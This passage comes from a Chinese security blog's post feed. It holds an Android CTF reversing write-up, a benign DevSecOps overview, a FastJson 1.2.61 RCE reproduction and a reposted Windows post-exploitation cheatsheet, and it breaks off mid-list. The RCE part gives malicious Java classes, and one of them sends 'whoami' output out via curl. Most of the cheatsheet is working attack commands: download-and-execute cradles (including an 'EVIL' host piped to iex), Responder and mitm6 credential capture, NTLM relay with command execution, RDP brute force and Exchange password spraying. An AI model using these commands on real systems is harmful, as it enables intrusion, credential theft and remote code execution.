&#x3D; nums[i] ^ 97 flag.append(first) else: sc &#x3D; nums[i] ^ nums[i-1] flag.append(sc) text &#x3D; &#39;&#39; for i in flag: text &#x3D; text + chr(i) print(text) &gt;&gt;&gt; SUSCTF&#123;We1come_to_Andr0id&#125; 后来看了其他资料，才发现a函数下面的for循环就是找16进制对应的十进制数，如 &gt;&gt;&gt; int(&#39;32&#39;,16) 50 其中是利用50找到对应的十进制32. 这个点卡了N久，看到一份别人的poc写的是相当简洁了。 CrackMe又是一个native层的APP。 IDA打开伪代码 根据汇编得知，中间for循环处操作的是数组 其中v11是给出的数据块，按照int型，四位一个字段，正好28个字段。 按照Java层逻辑和伪代码写出c代码为 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main()&#123; int v11[28] &#x3D; &#123;0x571a9693,0x23a96034,0x6a943d8c,0x1f9222ed,0x73887c81,0x5c13a257,0x26407522,0x13646a3a,0x2139537f,0x35415c5f,0x321304b7,0x238a8c26,0xd7307f6,0x622d5268,0x7c3d2e04,0x72198f7e,0x7df76af2,0x4e8431aa,0x28650861,0xfd8e3e9,0x196c1f1a,0x5fe8ab3,0x1231495d,0x5359d998,0x35fcfde0,0x3b2d0dd4,0x61113e45,0x314c57b8&#125;; &#x2F;&#x2F;小端字节序 int v0[28] &#x3D; &#123;0&#125;; int string[28] &#x3D; &#123;0&#125;; &#x2F;&#x2F;未定义,引入的参数变量 int i; for (i&#x3D;0; i&lt;28; i++)&#123; if (i &#x3D;&#x3D; 0)&#123; v0[i] &#x3D; string[i] ^ 0xFF; &#125; else&#123; v0[i] &#x3D; string[i] ^ string[i-1]; &#125; &#125; srand(0x133ED6B); int v4[28] &#x3D; &#123;0&#125;; for (i&#x3D;0; i&lt;28; i++)&#123; v4[i] &#x3D; v0[i] - rand(); if (v11[i] !&#x3D; v4[i])&#123; int v10 &#x3D; 0; return v10; &#125; int v10 &#x3D; 1; printf(&quot;%c&quot;,v10); return v10; &#125; &#125; 也就是我们需要反向求出string的值 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main()&#123; int v11[28] &#x3D; &#123;0x571a9693,0x23a96034,0x6a943d8c,0x1f9222ed,0x73887c81,0x5c13a257,0x26407522,0x13646a3a,0x2139537f,0x35415c5f,0x321304b7,0x238a8c26,0xd7307f6,0x622d5268,0x7c3d2e04,0x72198f7e,0x7df76af2,0x4e8431aa,0x28650861,0xfd8e3e9,0x196c1f1a,0x5fe8ab3,0x1231495d,0x5359d998,0x35fcfde0,0x3b2d0dd4,0x61113e45,0x314c57b8&#125;; int v0[28] &#x3D; &#123;0&#125;; srand(0x133ED6B); for (int i&#x3D;0; i&lt;28; i++)&#123; v0[i] &#x3D; v11[i] - rand(); &#125; int string[28] &#x3D; &#123;0&#125;; for (int i&#x3D;0; i&lt;28; i++)&#123; if (i&#x3D;&#x3D;0) string[i] &#x3D; v0[i] ^ 0xFF; else&#123; string[i] &#x3D; v0[i] ^ v0[i-1]; &#125; &#125; for (int i&#x3D;0; i&lt;28; i++)&#123; printf(&quot;%c&quot;, string[i]); &#125; return 0; &#125; 但是尴尬的是算出来的是乱码 然后没有找到这题的wp….也没找到其他问题的存在点。就这样吧，毕竟是汇编渣渣。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"DevSecOps","slug":"DevSecOps","date":"2019-10-15T05:59:55.000Z","updated":"2020-07-02T09:19:37.000Z","comments":true,"path":"2019/10/DevSecOps/","link":"","permalink":"https://misakikata.github.io/2019/10/DevSecOps/","excerpt":"","text":"什么是 DevSecOps?DevOps 不仅仅是开发和运营团队。如果您想要充分发挥出 DevOps 方法的敏捷性和响应力，则必须在应用的整个生命周期内同时兼顾 IT 安全性。 为什么？以往，安全性会在开发的最后阶段由特定的团队来负责实现。当开发周期长达数月、甚至数年时，上述做法不存在任何问题；但是，这种做法现在已经行不通了。有效的 DevOps 可顺利推进快速频繁的开发周期（有时全程只有数周或数天），但是过时的安全措施会对此造成负面影响，即使对于最高效的 DevOps 计划也是如此。 现在，安全防护在 DevOps 协作框架中属于共同责任，而且需要在整个周期中整合相应的安全功能。这是一个非常重要的理念。它还使得“DevSecOps”一词应运而生，以用于强调必须为 DevOps 计划打下扎实的安全基础。 DevSecOps 意味着，从一开始就要考虑应用和基础架构的安全性；同时还要让某些安全网关实现自动化，以防止 DevOps 工作流程变慢。选择正确的工具来持续确保安全性有助于实现安全目标。但是，有效的 DevOps 安全防护需要的不仅是新工具。它建立在 DevOps 文化变革的基础上，以便尽早集成安全团队的工作。 DevOps 安全性为内置特性无论您将其称为“DevOps”还是“DevSecOps”，最好始终能在应用的整个生命周期内确保安全性。DevSecOps 关乎内置安全性，而不是应用和数据层面的安全性。如果将安全性问题留到开发流程的最后环节再加以考虑，那么采用 DevOps 方案的组织会发现自己的开发周期又变长了，而这是他们从一开始就想要避免的情况。 在某种程度上，DevSecOps 强调，在 DevOps 计划刚启动时就要邀请安全团队来确保信息的安全性，并制定自动安全防护计划。它还强调，要帮助开发人员从代码层面确保安全性；在这个过程中，安全团队需要针对已知的威胁分享可见性信息、提供反馈并进行智能分析。这可能还包括为开发人员提供新的安全培训，因为 DevSecOps 并非始终着眼于较为传统的应用开发模式。 那么，怎样才算是真正地实现了内置安全性？对于新手而言，优质的 DevSecOps 策略应能确定风险承受能力并进行风险/收益分析。在一个给定的应用中，需要配备多少个安全控制功能？对于不同的应用，上市速度又有多重要？自动执行重复任务是 DevSecOps 的关键所在，因为在管道中运行手动安全检查可能会非常耗时。 DevOps 安全性可自动实现企业应该：确保采用时间短、频率高的开发周期；采取安全措施，以最大限度地缩短运营中断时间；采用创新技术，如容器和微服务；同时，还要促使常见的孤立团队加强合作 — 这对所有企业来说都是一项艰巨的任务。上述所有举措都与人有关，而且企业内部需要协同合作；但是，自动化才是有助于在 DevSecOps 框架中实现这些人员变化的关键所在。 那么，企业应该在哪些方面实现自动化？具体又该怎么做呢？红帽提供了相应的书面指南来帮助解答上述问题。企业应该退后一步，并着眼于整个开发和运营环境。其中涉及：源控制存储库；容器注册表；持续集成和持续部署 (CI/CD) 管道；应用编程接口 (API) 的管理、编排和发布自动化；以及运营管理和监控。 全新的自动化技术已帮助企业提高了开发实践的敏捷性，还在推动采用新的安全措施方面起到了重要作用。但是，自动化并不是近年来 IT 领域发生的唯一变化。现在，对于大多数 DevOps 计划而言，容器和微服务等云原生技术也是一个非常重要的组成部分。所以，企业必须调整 DevOps 安全措施，以适应这些技术。 DevOps 安全性适用于容器和微服务可通过容器实现的规模扩展和基础架构动态性提升改变了许多组织开展业务的方式。因此，DevOps 安全性实践必须适应新环境并遵循特定于容器的安全准则。云原生技术不适合用来落实静态安全策略和检查清单。相反，组织必须在应用和基础架构生命周期的每个阶段确保持续安全并整合相应的安全功能。 DevSecOps 意味着，要在应用开发的整个过程中确保安全性。要实现与管道的这种集成需要秉持一种全新的思维方式，就像使用新工具一样。考虑到这一点，DevOps 团队应该实现安全防护自动化，以保护整体环境和数据；同时实现持续集成/持续交付流程——可能还要确保容器中的微服务的安全性。 环境和数据安全性：实现环境的标准化和自动化。每项服务都应具有最小的权限，以最大限度地减少未经授权的连接和访问。 实现用户身份和访问控制功能的集中化。由于要在多个点发起身份验证，因此严格的访问控制和集中式身份验证机制对于确保微服务安全性而言至关重要。 使运行微服务的容器相互隔离并与网络隔离。这包括传输中和静止的数据，因为获取这两类数据是攻击者的高价值目标。 加密应用与服务间的数据。具有集成式安全功能的容器编排平台有助于最大限度地降低发生未经授权访问的可能性。 引入安全的 API 网关。安全的 API 可提高授权和路由的可见性。通过减少公开的 API，组织可以减小攻击面。 CI/CD 流程安全性：集成适用于容器的安全性扫描程序。应在向注册表添加容器的过程中实现这一点。 自动在 CI 过程中完成安全性测试。其中包括在构建过程中运行安全性静态分析工具；而且在构建管道中提取任何预构建容器映像时，都要进行扫描，以检查是否存在已知的安全漏洞。 在验收测试流程中加入针对安全性功能的自动化测试。自动执行输入验证测试，并针对验证操作实现身份验证和授权功能的自动化。 自动执行安全性更新，例如针对已知漏洞打修补。通过 DevOps 实现这一点。这样，在创建记录在案的可跟踪更改日志时，管理员便无需登录生产系统。 实现系统和服务配置管理功能的自动化。这样可以确保遵守安全策略，避免出现人为错误。审核和补救操作也应实现自动化。 以上信息来源：https://www.redhat.com/zh/topics/devops/what-is-devsecops DevSevOps 部分实现方案DevSecOps的目标是在短时间内使各种能力的人提高安全性。传统安全性的出发点是，一旦设计了系统，便可以由安全人员确定其安全缺陷，并由业务运营商在发布系统之前对其进行纠正。这允许将有限的安全检查应用于项目，并且避免了在大型系统中增加安全测试环境的需要。但是，以这种方式设计的流程仅在业务活动步伐迅猛且各方都同意的情况下才有效。不幸的是，安全性必须得以保证的理念逐渐被要求后，这个迭代过程便存在安全缺陷，并且此后在系统内部造成了固有风险。 archerysec: 是一个开源漏洞评估和管理工具，可帮助开发人员和渗透测试人员执行扫描和管理漏洞。准确的说这并不是一个完整的DevSecOps实现方案，但是在一般的DevOps中，不需要对Sec进行较大的投入下，满足的基本安全性能保证。当然也可以理解为，开发人员人手一个AWVS、openVAS扫描。 Gitlab+Jenkins+SonarQube：实现动态的代码审计，自动拖代码扫描出结果。目前据所知，有不少企业在这种方式上，开发Sonar插件来进行代码审计的安全性维护。 后面会采用开源的安全架构来实现Sec的功能，内容希望可以类似ossa，但又没必要这么全面。同样部分开源工具也和DevSecOps没太大关系的，但既然DevSecOps是为了每一个人的安全，开源工具在中小型甲方就有较大意义了。 参考文章： What is DevSecOps? Threat Modeling OWASP-AppSecEU awesome-devsecops","categories":[],"tags":[{"name":"Open Source Security","slug":"Open-Source-Security","permalink":"https://misakikata.github.io/tags/Open-Source-Security/"}]},{"title":"FastJson 1.2.61 RCE","slug":"FastJson-1-2-61-RCE","date":"2019-10-14T08:39:05.000Z","updated":"2019-10-14T08:46:38.187Z","comments":true,"path":"2019/10/FastJson-1-2-61-RCE/","link":"","permalink":"https://misakikata.github.io/2019/10/FastJson-1-2-61-RCE/","excerpt":"","text":"必备的jar包和Java 1.8.U20： fastjson-1.2.61.jar commons-configuration2-2.0.jar commons-lang3-3.3.2.jar commons-logging-1.2.jar 此处使用IDEA来做复现，首先导入这四个JAR包。创建使用POC的FastJsonTest。 此处使用RMI来做测试。同时创建一个恶意类，使用已经提供的恶意Java文件。 import java.io.BufferedReader; import java.io.InputStreamReader; public class ExportObject &#123; public ExportObject() throws Exception &#123; Process proc &#x3D; Runtime.getRuntime().exec(&quot;calc&quot;); BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(proc.getInputStream())); StringBuffer sb &#x3D; new StringBuffer(); String line; while((line &#x3D; br.readLine()) !&#x3D; null) &#123; sb.append(line).append(&quot;\\n&quot;); &#125; String result &#x3D; sb.toString(); Exception e &#x3D; new Exception(result); throw e; &#125; public static void main(String[] args) throws Exception &#123; &#125; &#125; 当然也可以使用之前版本RCE的恶意Java文件。需要做监听，达到回显的目的。 import java.io.BufferedInputStream; import java.io.BufferedReader; import java.io.InputStreamReader; public class Exploit &#123; public static String exec(String cmd) throws Exception &#123; String sb &#x3D; &quot;&quot;; BufferedInputStream in &#x3D; new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream()); BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in)); String lineStr; while ((lineStr &#x3D; inBr.readLine()) !&#x3D; null) sb +&#x3D; lineStr + &quot;\\n&quot;; inBr.close(); in.close(); return sb; &#125; public Exploit() throws Exception &#123; String result &#x3D; &quot;&quot;; result &#x3D; exec(&quot;whoami&quot;); String cmd&#x3D;&quot;curl http:&#x2F;&#x2F;x.x.x.x&#x2F;&quot;+result; throw new Exception(exec(cmd)); &#125; public static void main(String[] args) throws Exception &#123; String result &#x3D; &quot;&quot;; result &#x3D; exec(&quot;whoami&quot;); String cmd&#x3D;&quot;curl http:&#x2F;&#x2F;x.x.x.x&#x2F;&quot;+result; throw new Exception(exec(cmd)); &#125; &#125; 启动一个RMI监听服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;localhost:8000&#x2F;#ExportObject 开启一个http服务 python -m SimpleHTTPServer 运行IDEA中的POC，发现可以弹出计算器。 HTTP服务上也有请求的记录。 POC地址：https://github.com/jas502n/fastjson-1.2.61-RCE","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Windows Notes","slug":"Windows-Notes","date":"2019-10-11T02:11:47.000Z","updated":"2019-10-11T02:16:20.000Z","comments":true,"path":"2019/10/Windows-Notes/","link":"","permalink":"https://misakikata.github.io/2019/10/Windows-Notes/","excerpt":"","text":"文章是对windows后渗透的利用，提权和持久化等做的详细利用方式。 原文搬运：https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html EnumerationBasicsnet users net users &#x2F;domain net localgroup net groups &#x2F;domain net groups &#x2F;domain &quot;Domain Admins&quot; Get-ADUser Get-Domain Get-DomainUser Get-DomainGroup Get-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain m0chanAD.local -DomainController 10.10.14.10 Find-DomainShare #Host Discovery netdiscover -r subnet&#x2F;24 nbtscan -r [range] for &#x2F;L %i in (1,1,255) do @ping.exe -n 1 -w 50 &lt;10.10.10&gt;.%i | findstr TTL #Reverse DNS Lookup $ComputerIPAddress &#x3D; &quot;10.10.14.14&quot; [System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName https://github.com/tevora-threat/SharpView Users with SPNGet-DomainUser -SPN Get-ADComputer -filter &#123;ServicePrincipalName -like &lt;keyword&gt;&#125; -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack, PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation Kerberos Enumerationnmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm&#x3D;&#39;test&#39; Red-Team CSharp Scripts#https:&#x2F;&#x2F;github.com&#x2F;Mr-Un1k0d3r&#x2F;RedTeamCSharpScripts LDAPUtility.cs Usage: ldaputility.exe options domain [arguments] ldaputility.exe DumpAllUsers m0chan ldaputility.exe DumpUser m0chan mr.un1k0d3r ldaputility.exe DumpUsersEmail m0chan ldaputility.exe DumpAllComputers m0chan ldaputility.exe DumpComputer m0chan DC01 ldaputility.exe DumpAllGroups m0chan ldaputility.exe DumpGroup m0chan &quot;Domain Admins&quot; ldaputility.exe DumpPasswordPolicy m0chan Also WMIUtility.cs for WMI Calls &amp; LDAPQuery.cs for Raw LDAP Queries. See github linked above for full details. Active Directorynltest &#x2F;DCLIST:DomainName nltest &#x2F;DCNAME:DomainName nltest &#x2F;DSGETDC:DomainName # Get Current Domain Info - Similar to Get-Domain [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() # Get Domain Trust Info - Similar to Get-DomainTrust ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() # View Domain Info [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest() # View Domain Trust Information ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships() nltest [server:&lt;fqdn_foreign_domain&gt;] &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v nltest &#x2F;dsgetfti:&lt;domain&gt; nltest &#x2F;server:&lt;ip_dc&gt; &#x2F;domain_trusts &#x2F;all_trusts ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() # View All Domain Controllers nltest &#x2F;dclist:offense.local net group &quot;domain controllers&quot; &#x2F;domain # View DC for Current Session nltest &#x2F;dsgetdc:m0chanAD.local # View Domain Trusts from CMD nltest &#x2F;domain_trusts # View User Info from CMD nltest &#x2F;user:&quot;m0chan&quot; # get domain name and DC the user authenticated to klist # Get All Logged on Sessions, Includes NTLM &amp; Kerberos klist sessions # View Kerb Tickets klist # View Cached Krbtgt klist tgt # whoami on older Windows systems set u #List all Usernames ([adsisearcher]&quot;(&amp;(objectClass&#x3D;User)(samaccountname&#x3D;*))&quot;).FindAll().Properties.samaccountname #List Administrators ([adsisearcher]&quot;(&amp;(objectClass&#x3D;User)(admincount&#x3D;1))&quot;).FindAll().Properties.samaccountname #List all Info about Specific User ([adsisearcher]&quot;(&amp;(objectClass&#x3D;User)(samaccountname&#x3D;&lt;username&gt;))&quot;).FindAll().Properties #View All Users with Description Field Set ([adsisearcher]&quot;(&amp;(objectClass&#x3D;group)(samaccountname&#x3D;*))&quot;).FindAll().Properties | % &#123; Write-Host $_.samaccountname : $_.description &#125; AD Enumeration from Linux Box - AD Tool#https:&#x2F;&#x2F;github.com&#x2F;jasonwbarnett&#x2F;linux-adtool tar zxvf adtools-1.x.tar.gz cd adtools-1.x .&#x2F;configure make make install &gt; adtool list ou&#x3D;user,dc&#x3D;example,dc&#x3D;com CN&#x3D;allusers,OU&#x3D;user,DC&#x3D;example,DC&#x3D;com OU&#x3D;finance,OU&#x3D;user,DC&#x3D;example,DC&#x3D;com OU&#x3D;administration,OU&#x3D;user,DC&#x3D;example,DC&#x3D;com &gt; adtool oucreate marketing ou&#x3D;user,dc&#x3D;example,dc&#x3D;com &gt; adtool useradd jsmith ou&#x3D;marketing,ou&#x3D;user,dc&#x3D;example,dc&#x3D;com &gt; adtool setpass jsmith banana &gt; adtool unlock jsmith &gt; adtool groupadd allusers jsmith &gt; adtool attributereplace jsmith telephonenumber 123 &gt; adtool attributereplace jsmith mail jsmith@example.com SharpView Enumeration#https:&#x2F;&#x2F;github.com&#x2F;tevora-threat&#x2F;SharpView Get-DomainFileServer Get-DomainGPOUserLocalGroupMapping Find-GPOLocation Get-DomainGPOComputerLocalGroupMapping Find-GPOComputerAdmin Get-DomainObjectAcl Get-ObjectAcl Add-DomainObjectAcl Add-ObjectAcl Remove-DomainObjectAcl Get-RegLoggedOn Get-LoggedOnLocal Get-NetRDPSession Test-AdminAccess Invoke-CheckLocalAdminAccess Get-WMIProcess Get-NetProcess Get-WMIRegProxy Get-Proxy Get-WMIRegLastLoggedOn Get-LastLoggedOn Get-WMIRegCachedRDPConnection Get-CachedRDPConnection Get-WMIRegMountedDrive Get-RegistryMountedDrive Find-InterestingDomainAcl Invoke-ACLScanner Get-NetShare Get-NetLoggedon SMB Enumerationnmap -p 139,445 --script smb.nse,smb-enum-shares,smbls enum4linux 1.3.3.7 smbmap -H 1.3.3.7 smbclient -L \\\\INSERTIPADDRESS smbclient -L INSERTIPADDRESS smbclient &#x2F;&#x2F;INSERTIPADDRESS&#x2F;tmp smbclient \\\\\\\\INSERTIPADDRESS\\\\ipc$ -U john smbclient &#x2F;&#x2F;INSERTIPADDRESS&#x2F;ipc$ -U john smbclient &#x2F;&#x2F;INSERTIPADDRESS&#x2F;admin$ -U john nbtscan [SUBNET] #Check for SMB Signing nmap --script smb-security-mode.nse -p 445 10.10.14.14 SNMP Enumerationsnmpwalk -c public -v1 10.10.14.14 snmpcheck -t 10.10.14.14 -c public onesixtyone -c names -i hosts nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt snmpenum -t 10.10.14.14 MySQL Enumerationnmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 DNS Zone Transferdig axfr blah.com @ns1.m0chan.com nslookup -&gt; set type&#x3D;any -&gt; ls -d m0chan.com dnsrecon -d m0chan -D &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dnsmap.txt -t std --xml ouput.xml LDAPldapsearch -H ldap:&#x2F;&#x2F;&lt;ip&gt; ldapwhoami RPC Enumerationrpcclient -U &quot;10.10.14.14&quot; srvinfo enumdomusers enumalsgroups domain lookupnames administrators querydominfo enumdomusers queryuser &lt;user&gt; lsaquery lookupnames Guest lookupnames Administrator Remote Desktoprdesktop -u guest -p guest INSERTIPADDRESS -g 94% # Brute force ncrack -vv --user Administrator -P &#x2F;root&#x2F;oscp&#x2F;passwords.txt rdp:&#x2F;&#x2F;INSERTIPADDRESS File TransferTFTPm0chan Machine mkdir tftp atftpd --deamon --port 69 tftp cp *file* tftp On victim machine: tftp -i &lt;[IP]&gt; GET &lt;[FILE]&gt; FTPecho open &lt;[IP]&gt; 21 &gt; ftp.txt echo USER demo &gt;&gt; ftp.txt echo ftp &gt;&gt; ftp.txt echo bin &gt;&gt; ftp.txt echo GET nc.exe &gt;&gt; ftp.txt echo bye &gt;&gt; ftp.txt ftp -v -n -s:ftp.txt VBS Scriptecho strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbs echo StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT &#x3D; 1 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY &#x3D; 2 &gt;&gt; wget.vbs echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs echo Err.Clear &gt;&gt; wget.vbs echo Set http &#x3D; Nothing &gt;&gt; wget.vbs echo Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs echo http.Send &gt;&gt; wget.vbs echo varByteArray &#x3D; http.ResponseBody &gt;&gt; wget.vbs echo Set http &#x3D; Nothing &gt;&gt; wget.vbs echo Set fs &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs echo Set ts &#x3D; fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs echo strData &#x3D; &quot;&quot; &gt;&gt; wget.vbs echo strBuffer &#x3D; &quot;&quot; &gt;&gt; wget.vbs echo For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs echo Next &gt;&gt; wget.vbs echo ts.Close &gt;&gt; wget.vbs cscript wget.vbs &lt;url&gt; &lt;out_file&gt; Use echoup function on pentest.ws to generate echo commands. https:&#x2F;&#x2F;pentest.ws&#x2F;features Powershell#https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-CradleCrafter Use this to craft obsufacted cradles Invoke-WebRequest &quot;https:&#x2F;&#x2F;server&#x2F;filename&quot; -OutFile &quot;C:\\Windows\\Temp\\filename&quot; (New-Object System.Net.WebClient).DownloadFile(&quot;https:&#x2F;&#x2F;server&#x2F;filename&quot;, &quot;C:\\Windows\\Temp\\filename&quot;) #Powershell Download to Memory IEX(New-Object Net.WebClient).downloadString(&#39;http:&#x2F;&#x2F;server&#x2F;script.ps1&#39;) #Powershell with Proxy $browser &#x3D; New-Object System.Net.WebClient; $browser.Proxy.Credentials &#x3D; [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX($browser.DownloadString(&#39;https:&#x2F;&#x2F;server&#x2F;script.ps1&#39;)); Powershell Base64$fileName &#x3D; &quot;Passwords.kdbx&quot; $fileContent &#x3D; get-content $fileName $fileContentBytes &#x3D; [System.Text.Encoding]::UTF8.GetBytes($fileContent) $fileContentEncoded &#x3D; [System.Convert]::ToBase64String($fileContentBytes) $fileContentEncoded | set-content ($fileName + &quot;.b64&quot;) Secure Copy / pscp.exepscp.exe C:\\Users\\Public\\m0chan.txt user@target:&#x2F;tmp&#x2F;m0chan.txt pscp.exe user@target:&#x2F;home&#x2F;user&#x2F;m0chan.txt C:\\Users\\Public\\m0chan.txt BitsAdmin.execmd.exe &#x2F;c &quot;bitsadmin.exe &#x2F;transfer downld_job &#x2F;download &#x2F;priority high http:&#x2F;&#x2F;c2.m0chan.com C:\\Temp\\mimikatz.exe &amp; start C:\\Temp\\binary.exe&quot; Remote Desktoprdesktop 10.10.10.10 -r disk:linux&#x3D;&#39;&#x2F;home&#x2F;user&#x2F;filetransferout&#39; WinHTTP Com Object[System.Net.WebRequest]::DefaultWebProxy [System.Net.CredentialCache]::DefaultNetworkCredentials $h&#x3D;new-object -com WinHttp.WinHttpRequest.5.1;$h.open(&#39;GET&#39;,&#39;http:&#x2F;&#x2F;EVIL&#x2F;evil.ps1&#39;,$false);$h.send();iex $h.responseText CertUtil#File Transfer certutil.exe -urlcache -split -f https:&#x2F;&#x2F;m0chan:8888&#x2F;filename outputfilename #CertUtil Base64 Transfers certutil.exe -encode inputFileName encodedOutputFileName certutil.exe -decode encodedInputFileName decodedOutputFileName Curl (Windows 1803+)curl http:&#x2F;&#x2F;server&#x2F;file -o file curl http:&#x2F;&#x2F;server&#x2F;file.bat | cmd IEX(curl http:&#x2F;&#x2F;server&#x2F;script.ps1);Invoke-Blah SMBpython smbserver.py Share &#96;pwd&#96; -u m0chan -p m0chan --smb-2support ExploitLLMNR / NBT-NS Spoofing#Responder to Steal Creds git clone https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;Responder.git python Responder.py -i local-ip -I eth0 LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i&#x2F;e if you search \\\\HRServer\\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like &#39;Yeah I&#39;m HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below&#39; Responder WPAD Attackresponder -I eth0 wpad By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet Go to internet explorer and search for Google which automatically searches for a WPAD file... Then take NTLMv2 hash and NTLM Relay it or send to cracking rig. mitm6#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. By default IPV6 should be enabled. git clone https:&#x2F;&#x2F;github.com&#x2F;fox-it&#x2F;mitm6.git cd &#x2F;opt&#x2F;tools&#x2F;mitm6 pip install . mitm6 -d m0chanAD.local Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS &#x3D; controlled by attacker. ntlmrelayx.py -wh webserverhostingwpad:80 -t smb:&#x2F;&#x2F;TARGETIP&#x2F; -i -i opens an interactive shell. Shout out to hausec for this super nice tip. SCF File AttackCreate .scf file and drop inside SMB Share and fire up Responder ;) Filename &#x3D; @m0chan.scf [Shell] Command&#x3D;2 IconFile&#x3D;\\\\10.10.14.2\\Share\\test.ico [Taskbar] Command&#x3D;ToggleDesktop NTLM-RelayGood article explaining differences between NTLM&#x2F;Net-NTLMV1&amp;V2 https:&#x2F;&#x2F;byt3bl33d3r.github.io&#x2F;practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html TL;DR NTLMv1&#x2F;v2 is a shorthand for Net-NTLMv1&#x2F;v2 and hence are the same thing. You CAN perform Pass-The-Hash attacks with NTLM hashes. You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes. PS: You CANNOT relay a hash back to itself. PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec crackmapexec smb 10.10.14.0&#x2F;24 --gene-relay-list targets.txt This will tell you a list of hosts within a subnet which do not have SMB Signing enabled. python Responder.py -I &lt;interface&gt; -r -d -w ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?) How about we execute a command instead. ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd ntlmrelayx.py -tf targets.txt -c powershell.exe &#x2F;c download and execute beacon... &#x3D; RIP Priv Exchange#https:&#x2F;&#x2F;dirkjanm.io&#x2F;abusing-exchange-one-api-call-away-from-domain-admin&#x2F; Combine privxchange.py and ntlmrelayx ntlmrelayx.py -t ldap:&#x2F;&#x2F;DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local Exchange Password Spray#https:&#x2F;&#x2F;github.com&#x2F;dafthack&#x2F;MailSniper.git Invoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\\users.txt -Password Winter2019 #https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;ruler .&#x2F;ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v ExchangeRelayX#https:&#x2F;&#x2F;github.com&#x2F;quickbreach&#x2F;ExchangeRelayX An NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers. .&#x2F;exchangeRelayx.py -t https:&#x2F;&#x2F;mail.quickbreach.com Exchange Mailbox Post-Compromise#https:&#x2F;&#x2F;github.com&#x2F;dafthack&#x2F;MailSniper.git Enumerate GlobalAddressList Get-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019 Enumerate AD Usernames Get-ADUsernameFromEWS -Emaillist .\\users.txt Enumerate Mailbox Folders Get-MailboxFolders -Mailbox jamie@m0chanAD.local Enumerate 